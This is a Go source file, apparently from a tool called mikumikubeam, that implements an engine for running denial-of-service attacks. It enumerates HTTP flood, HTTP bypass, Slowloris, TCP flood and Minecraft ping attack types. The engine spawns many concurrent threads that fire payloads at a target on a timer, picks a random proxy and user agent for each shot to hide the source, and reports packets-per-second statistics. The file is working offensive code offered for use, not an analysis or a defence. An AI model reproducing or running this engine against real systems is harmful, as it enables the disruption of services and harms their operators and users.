package engine

import (
	"context"
	"math/rand"
	"runtime"
	"sync"
	"time"

	targetpkg "github.com/sammwyy/mikumikubeam/pkg/target"
)

// AttackKind enumerates supported attack types.
type AttackKind string

const (
	AttackHTTPFlood     AttackKind = "http_flood"
	AttackHTTPBypass    AttackKind = "http_bypass"
	AttackHTTPSlowloris AttackKind = "http_slowloris"
	AttackTCPFlood      AttackKind = "tcp_flood"
	AttackMinecraftPing AttackKind = "minecraft_ping"
)

// AttackParams are common parameters for an attack.
type AttackParams struct {
	Target      string
	TargetNode  targetpkg.Node
	Duration    time.Duration
	PacketDelay time.Duration
	PacketSize  int
	Method      AttackKind
	Threads     int
	Verbose     bool // Whether to send detailed logs
}

// Proxy represents a network proxy.
type Proxy struct {
	Username string
	Password string
	Protocol string
	Host     string
	Port     int
}

// AttackStats represents live stats reported by workers.
type AttackStats struct {
	Timestamp    time.Time
	PacketsPerS  int64
	TotalPackets int64
	Proxies      int
	Log          string
}

// AttackWorker is implemented by each attack method implementation.
type AttackWorker interface {
	// Fire sends a single payload for the given params using the provided proxy and user agent.
	// It should return quickly and not block the caller; engine will dispatch concurrently.
	// The log channel can be used to send individual attack logs.
	Fire(ctx context.Context, params AttackParams, proxy Proxy, userAgent string, logCh chan<- AttackStats) error
}

// Engine coordinates attacks and worker lifecycles.
type Engine struct {
	registry Registry
	mu       sync.RWMutex
	attacks  map[string]*AttackInstance // attackID -> AttackInstance
}

// AttackInstance represents a single running attack
type AttackInstance struct {
	ID        string
	Params    AttackParams
	Cancel    context.CancelFunc
	StatsCh   chan AttackStats
	TotalSent int64
	mu        sync.RWMutex
}

func NewEngine(reg Registry) *Engine {
	return &Engine{
		registry: reg,
		attacks:  make(map[string]*AttackInstance),
	}
}

// Start launches a new attack with a unique ID
func (e *Engine) Start(attackID string, parent context.Context, params AttackParams, proxies []Proxy, userAgents []string) (<-chan AttackStats, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	// Stop existing attack with same ID if running
	if existing, exists := e.attacks[attackID]; exists {
		existing.Cancel()
		delete(e.attacks, attackID)
	}

	worker, ok := e.registry.Get(params.Method)
	if !ok {
		// Create a temporary stats channel for unsupported method
		tempCh := make(chan AttackStats, 1)
		tempCh <- AttackStats{Timestamp: time.Now(), Log: "unsupported attack method"}
		close(tempCh)
		return tempCh, nil
	}

	ctx, cancel := context.WithCancel(parent)
	statsCh := make(chan AttackStats, 1024)

	instance := &AttackInstance{
		ID:        attackID,
		Params:    params,
		Cancel:    cancel,
		StatsCh:   statsCh,
		TotalSent: 0,
	}

	e.attacks[attackID] = instance

	// Determine threads
	threads := params.Threads
	if threads <= 0 {
		threads = runtime.NumCPU()
	}
	proxyCount := len(proxies)
	uaCount := len(userAgents)

	// Aggregator: send stats every second
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastTotal int64
		for {
			select {
			case <-ctx.Done():
				// Close channel safely
				select {
				case <-statsCh:
					// Drain any remaining messages
				default:
				}
				close(statsCh)
				e.mu.Lock()
				delete(e.attacks, attackID)
				e.mu.Unlock()
				return
			case t := <-ticker.C:
				instance.mu.RLock()
				total := instance.TotalSent
				instance.mu.RUnlock()
				delta := total - lastTotal
				lastTotal = total
				// Only send stats if there's actual activity (delta > 0) or it's the first tick
				if delta > 0 || lastTotal == 0 {
					select {
					case statsCh <- AttackStats{
						Timestamp:    t,
						PacketsPerS:  delta,
						TotalPackets: total,
						Proxies:      proxyCount,
						Log:          "", // Empty log - individual workers will send their own logs
					}:
					case <-ctx.Done():
						return
					}
				}
			}
		}
	}()

	// Thread loops
	for i := 0; i < threads; i++ {
		go func(threadID int) {
			// align first fire immediately
			ticker := time.NewTicker(params.PacketDelay)
			defer ticker.Stop()

			// immediate first dispatch
			dispatch := func() {
				// pick proxy and ua (random)
				var p Proxy
				var ua string
				if proxyCount > 0 {
					p = proxies[rand.Intn(proxyCount)]
				}
				if uaCount > 0 {
					ua = userAgents[rand.Intn(uaCount)]
				}
				go func() {
					_ = worker.Fire(ctx, params, p, ua, statsCh)
				}()
				instance.mu.Lock()
				instance.TotalSent++
				instance.mu.Unlock()
			}

			deadline := time.Now().Add(params.Duration)
			dispatch()
			for {
				if !deadline.IsZero() && time.Now().After(deadline) {
					return
				}
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					dispatch()
				}
			}
		}(i)
	}

	return statsCh, nil
}

// Stop cancels a specific attack by ID
func (e *Engine) Stop(attackID string) {
	e.mu.Lock()
	defer e.mu.Unlock()
	if instance, exists := e.attacks[attackID]; exists {
		// Cancel the context first to stop all workers
		instance.Cancel()
		// Remove from map immediately to prevent new operations
		delete(e.attacks, attackID)
	}
}

// StopAll cancels all running attacks
func (e *Engine) StopAll() {
	e.mu.Lock()
	defer e.mu.Unlock()
	for _, instance := range e.attacks {
		instance.Cancel()
	}
	e.attacks = make(map[string]*AttackInstance)
}

// IsRunning checks if a specific attack is running
func (e *Engine) IsRunning(attackID string) bool {
	e.mu.RLock()
	defer e.mu.RUnlock()
	_, exists := e.attacks[attackID]
	return exists
}

// GetRunningAttacks returns a list of running attack IDs
func (e *Engine) GetRunningAttacks() []string {
	e.mu.RLock()
	defer e.mu.RUnlock()
	ids := make([]string, 0, len(e.attacks))
	for id := range e.attacks {
		ids = append(ids, id)
	}
	return ids
}
